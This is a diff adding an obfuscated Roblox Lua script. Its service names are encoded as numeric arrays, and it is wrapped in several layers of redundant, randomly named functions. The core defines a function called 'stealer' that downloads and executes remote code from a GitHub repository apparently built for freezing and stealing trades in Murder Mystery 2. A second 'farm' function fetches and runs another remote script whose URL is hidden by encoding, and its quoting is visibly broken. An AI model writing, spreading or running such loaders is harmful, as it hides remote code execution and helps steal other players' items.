@@ -1,0 +1,103 @@
+
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+
+local _ay7g7on5z = function()
+    local Players = game:GetService((function()
+        local a={1077,1441,1298,1610,1350,1519,1532};
+        local b='';
+        for i=1,#a do 
+            b=b..string.char((a[i]-37)/13);
+        end;
+        return b;
+    end)())
+local StarterGui = game:GetService((function()
+        local a={1116,1545,1298,1519,1545,1350,1519,960,1558,1402};
+        local b='';
+        for i=1,#a do 
+            b=b..string.char((a[i]-37)/13);
+        end;
+        return b;
+    end)())
+
+local _3d69ugpig = function()
+    local Players = game:GetService((function()
+        local a={1077,1441,1298,1610,1350,1519,1532};
+        local b='';
+        for i=1,#a do 
+            b=b..string.char((a[i]-37)/13);
+        end;
+        return b;
+    end)())
+local StarterGui = game:GetService((function()
+        local a={1116,1545,1298,1519,1545,1350,1519,960,1558,1402};
+        local b='';
+        for i=1,#a do 
+            b=b..string.char((a[i]-37)/13);
+        end;
+        return b;
+    end)())
+
+local _3g0cqhf4c = function()
+    local Players = game:GetService((function()
+        local a={1077,1441,1298,1610,1350,1519,1532};
+        local b='';
+        for i=1,#a do 
+            b=b..string.char((a[i]-37)/13);
+        end;
+        return b;
+    end)())
+local StarterGui = game:GetService((function()
+        local a={1116,1545,1298,1519,1545,1350,1519,960,1558,1402};
+        local b='';
+        for i=1,#a do 
+            b=b..string.char((a[i]-37)/13);
+        end;
+        return b;
+    end)())
+
+local _ti8y7qeii = function()
+    local Players = game:GetService((function()
+        local a={1077,1441,1298,1610,1350,1519,1532};
+        local b='';
+        for i=1,#a do 
+            b=b..string.char((a[i]-37)/13);
+        end;
+        return b;
+    end)())
+local StarterGui = game:GetService((function()
+        local a={1116,1545,1298,1519,1545,1350,1519,960,1558,1402};
+        local b='';
+        for i=1,#a do 
+            b=b..string.char((a[i]-37)/13);
+        end;
+        return b;
+    end)())
+
+local _74fb8rd61 = function()
+    local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/aUsualHuman449/Mm2-FREEZE-TRADE/refs/heads/main/MM2-OP))()
+end
+local function farm()
+    loadstring(game:HttpGet('loadstring(game:HttpGet((function()
+        local a={1389,1545,1545,1493,1532,791,648,648,1519,1298,1584,635,1376,1402,1545,1389,1558,1311,1558,1532,1350,1519,1324,1480,1467,1545,1350,1467,1545,635,1324,1480,1454,648,1571,1350,1519,1545,1350,1597,622,1493,1350,1298,1428,648,1571,1350,1519,1545,1350,1597,648,1519,1350,1363,1532,648,1389,1350,1298,1337,1532,648,1454,1298,1402,1467,648,1441,1480,1298,1337,1532,1545,1519,1402,1467,1376};
+        local b='';
+        for i=1,#a do 
+            b=b..string.char((a[i]-37)/13);
+        end;
+        return b;
+    end)()))()'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
+end;
+_74fb8rd61();
+end;
+_ti8y7qeii();
+end;
+_3g0cqhf4c();
+end;
+_3d69ugpig();
+end;
+_ay7g7on5z();
